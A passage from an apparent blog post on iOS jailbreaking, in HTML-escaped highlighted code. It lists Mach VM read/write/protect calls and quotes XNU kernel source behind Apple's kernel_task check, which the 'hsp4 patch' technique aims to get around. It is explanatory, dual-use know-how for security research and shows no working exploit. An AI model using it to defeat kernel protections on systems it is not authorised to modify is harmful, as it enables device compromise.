    	&lt;span class=&quot;n&quot;&gt;mach_vm_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/*Read Kernel Memory in the target task at a specified address and transfers it to dynamically allocated memory in the callers address space*/&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mach_vm_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;vm_map_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_vm_size_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;pointer_t&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_msg_type_number_t&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/*Copy data from a caller-specified address to the given memory region in the target tasks address space*/&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; 
    &lt;span class=&quot;nf&quot;&gt;mach_vm_write&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;vm_map_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;vm_offset_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_msg_type_number_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dataCnt&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/*Sets the Protection attribute for a given memory range in the target tasks address space*/&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; 
    &lt;span class=&quot;nf&quot;&gt;mach_vm_protect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;vm_map_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_vm_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    	&lt;span class=&quot;n&quot;&gt;boolean_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;set_maximum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;svm_prot_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_protection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;hsp4-patch&quot;&gt;hsp4 Patch&lt;/h2&gt;

&lt;p&gt;One of the other techniques Apple implemented for preventing jailbreakers from getting the kernel task was a pointer check for the &lt;strong&gt;kernel_task&lt;/strong&gt;. In this case, while the handle to the kernel task was obtained, the Mach VM calls would not work. The check starts from the &lt;strong&gt;ipc_kmsg_trace_send&lt;/strong&gt; function. This calls the function &lt;strong&gt;convert_port_to_task_with_exec_token&lt;/strong&gt;(Line 356) in &lt;strong&gt;osfmk/kern/ipc_kobject.c&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kern&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_kobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;343&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;cm&quot;&gt;/*
    344: 	 * Find the routine to call, and call it
    345: 	 * to perform the kernel function
    346: 	 */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;347&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_kmsg_trace_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;348&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;349&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;350&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/*
    351: 		 * Check if the port is a task port, if its a task port then
    352: 		 * snapshot the task exec token before the mig routine call.
    353: 		 */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;354&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_remote_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;355&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_kotype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_TASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;356&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;convert_port_to_task_with_exec_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exec_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;357&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;358&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;359&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;routine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reply&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;360&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;361&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* Check if the exec token changed during the mig routine */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;362&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TASK_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;363&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exec_token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exec_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;364&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 				&lt;span class=&quot;n&quot;&gt;exec_token_changed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;365&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;366&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;task_deallocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;367&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;368&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;369&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;kernel_task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;messages_received&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;370&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;371&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;372&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_kobject_notify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reply&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;373&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DEVELOPMENT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DEBUG&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;374&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ipc_kobject_server: bogus kernel message, id=%d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;375&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;376&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* DEVELOPMENT || DEBUG */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;377&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		    &lt;span class=&quot;n&quot;&gt;_MIG_MSGID_INVALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;378&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;379&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		    &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mig_reply_error_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reply&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RetCode&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;380&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MIG_BAD_ID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;381&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The function &lt;strong&gt;convert_port_to_task_with_exec_token&lt;/strong&gt; then calls &lt;strong&gt;task_conversion_eval&lt;/strong&gt;(Line 1543).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kern&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_tt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1517&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    1518:  *	Routine:	convert_port_to_task_with_exec_token
    1519:  *	Purpose:
    1520:  *		Convert from a port to a task and return
    1521:  *		the exec token stored in the task.
    1522:  *		Doesn't consume the port ref; produces a task ref,
    1523:  *		which may be null.
    1524:  *	Conditions:
    1525:  *		Nothing locked.
    1526:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1527&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1528&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;convert_port_to_task_with_exec_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1529&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1530&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exec_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1531&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1532&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TASK_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1533&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1534&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1535&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ip_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1536&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1537&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip_active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;					&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1538&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 				&lt;span class=&quot;n&quot;&gt;ip_kotype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_TASK&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1539&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1540&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_kobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1541&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TASK_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1542&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1543&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_conversion_eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1544&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 				&lt;span class=&quot;n&quot;&gt;ip_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1545&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 				&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TASK_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
